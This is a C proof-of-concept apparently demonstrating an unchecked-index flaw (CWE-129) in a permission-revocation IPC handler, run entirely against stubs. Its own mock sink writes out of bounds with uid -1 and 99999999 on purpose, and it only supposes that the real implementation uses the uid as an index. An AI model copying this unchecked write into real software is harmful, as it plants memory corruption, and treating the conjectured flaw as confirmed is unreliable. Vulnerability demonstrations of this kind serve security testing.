/*
 * PoC: Buffer access with untrusted index without bounds validation
 * 
 * Vulnerability: ReplyRevokeRuntimePermission reads a uid (int64_t) from an
 * IPC request without any bounds validation. This uid value is then passed
 * directly to api->RevokeRuntimePermission(uid, permName). If the underlying
 * implementation uses uid as an array index (common in permission management
 * systems to index into a per-uid permission table), the lack of bounds
 * checking allows an attacker to supply a negative or excessively large uid
 * value, causing an out-of-bounds array access.
 *
 * CWE-129: Improper Validation of Array Index
 * 
 * How input triggers it:
 *   - Attacker crafts an IPC message with uid = -1 (or a very large value)
 *   - ReadInt64(req, &uid) reads this untrusted value without validation
 *   - api->RevokeRuntimePermission(uid, permName) uses uid as an index
 *   - No bounds check exists between reading uid and using it as an index
 *
 * Expected behavior: Out-of-bounds memory access / crash (SIGSEGV or
 * heap/stack corruption)
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>

/* Stub types and definitions for external dependencies */
typedef int pid_t;
typedef unsigned int uid_t;

/* Stub IPC types */
typedef struct {
    char *buffer;
    size_t offset;
    size_t size;
} IpcIo;

/* Stub logging macro */
#define HILOG_MODULE_APP 0
#define HILOG_INFO(module, fmt, ...) printf("[LOG] " fmt "\n", ##__VA_ARGS__)

/* Stub IPC helper functions */
static pid_t GetCallingPid(void) { return 1000; }
static uid_t GetCallingUid(void) { return 1000; }

/* 
 * Crafted IPC buffer: contains a malicious uid value followed by a permission string.
 * The uid is set to -1 (0xFFFFFFFFFFFFFFFF) to trigger out-of-bounds access.
 */
static int64_t g_malicious_uid = -1;  /* Untrusted index: negative value */
static char *g_malicious_perm = "ohos.permission.CAMERA";
static int g_read_uid_called = 0;

/* Stub: ReadInt64 - simulates reading a crafted int64 from IPC buffer */
static bool ReadInt64(IpcIo *req, int64_t *value) {
    /* Attacker-controlled value flows in here without bounds check */
    *value = g_malicious_uid;
    printf("[PoC] ReadInt64: read malicious uid = %lld (no bounds check)\n", (long long)*value);
    g_read_uid_called = 1;
    return true;
}

/* Stub: ReadString - simulates reading a string from IPC buffer */
static char *ReadString(IpcIo *req, size_t *len) {
    *len = strlen(g_malicious_perm);
    printf("[PoC] ReadString: read permName = \"%s\"\n", g_malicious_perm);
    return g_malicious_perm;
}

/* Stub: WriteInt32 */
static bool WriteInt32(IpcIo *reply, int32_t value) {
    printf("[PoC] WriteInt32: writing result = %d\n", value);
    return true;
}

/*
 * Simulated permission table - small fixed-size array.
 * The vulnerability is that uid is used as an index into such a table
 * without bounds validation.
 */
#define MAX_UIDS 64
static int g_permission_table[MAX_UIDS];

/* 
 * Simulated RevokeRuntimePermission implementation that uses uid as array index.
 * This is the sink where the out-of-bounds access occurs.
 */
static int32_t MockRevokeRuntimePermission(int64_t uid, const char *permName) {
    printf("[PoC] RevokeRuntimePermission called with uid=%lld, permName=\"%s\"\n",
           (long long)uid, permName ? permName : "NULL");
    
    /* TRIGGER: uid is used as an array index without bounds validation.
     * With uid = -1, this accesses g_permission_table[-1], which is
     * out-of-bounds memory access. With a large uid, it accesses beyond
     * the array end. */
    printf("[PoC] TRIGGER: About to access g_permission_table[%lld] (array size=%d)\n",
           (long long)uid, MAX_UIDS);
    
    /* TRIGGER: Buffer access with untrusted index without bounds validation */
    g_permission_table[uid] = 0;  /* OUT-OF-BOUNDS WRITE */
    
    printf("[PoC] If you see this, the OOB write did not crash (but memory is corrupted)\n");
    return 0;
}

/* Inner API struct */
typedef struct {
    int32_t (*RevokeRuntimePermission)(int64_t uid, const char *permName);
} InnerPermLiteApi;

/* Chain step: entry_point -> ReplyRevokeRuntimePermission (the vulnerable function) */
/* Real source code of the vulnerable function included verbatim: */
static void ReplyRevokeRuntimePermission(const void *origin, IpcIo *req, IpcIo *reply, InnerPermLiteApi* api)
{
    pid_t callingPid = GetCallingPid();
    uid_t callingUid = GetCallingUid();
    HILOG_INFO(HILOG_MODULE_APP, "Enter ID_REVOKERUNTIME, [callerPid: %d][callerUid: %u]", callingPid, callingUid);
    size_t permLen = 0;
    int64_t uid;
    /* WHY: ReadInt64 reads attacker-controlled uid with no bounds check */
    ReadInt64(req, &uid);
    char *permName = (char *)ReadString(req, &permLen);
    /* Chain step: ReplyRevokeRuntimePermission -> api->RevokeRuntimePermission
     * The untrusted uid value flows directly to the permission revocation function
     * which uses it as an array index */
    int32_t ret = api->RevokeRuntimePermission(uid, permName);
    HILOG_INFO(HILOG_MODULE_APP, "revoke runtime permission, [uid: %lld][perm: %s][ret: %d]", uid, permName, ret);
    WriteInt32(reply, ret);
}

int main(int argc, char *argv[]) {
    printf("[PoC] === Buffer access with untrusted index (no bounds validation) ===\n");
    printf("[PoC] Vulnerability in ReplyRevokeRuntimePermission at line 181\n");
    printf("[PoC] Crafting IPC request with malicious uid = %lld\n\n", (long long)g_malicious_uid);

    /* Set up the IPC structures */
    IpcIo req = { .buffer = NULL, .offset = 0, .size = 0 };
    IpcIo reply = { .buffer = NULL, .offset = 0, .size = 0 };

    /* Set up the API with our mock that demonstrates the OOB access */
    InnerPermLiteApi api;
    api.RevokeRuntimePermission = MockRevokeRuntimePermission;

    printf("[PoC] Calling ReplyRevokeRuntimePermission with crafted IPC data...\n\n");

    /* Chain step: main -> ReplyRevokeRuntimePermission
     * The crafted IPC buffer contains uid=-1 which will be used as an
     * unchecked array index in the permission revocation logic */
    ReplyRevokeRuntimePermission(NULL, &req, &reply, &api);

    printf("\n[PoC] === Test with large positive uid (beyond array bounds) ===\n");
    g_malicious_uid = 99999999LL;  /* Way beyond MAX_UIDS=64 */
    printf("[PoC] Crafting IPC request with malicious uid = %lld\n\n", (long long)g_malicious_uid);
    
    /* This second call demonstrates the same vulnerability with a large positive index */
    ReplyRevokeRuntimePermission(NULL, &req, &reply, &api);

    printf("\n[PoC] Done. If no crash occurred, memory corruption happened silently.\n");
    return 0;
}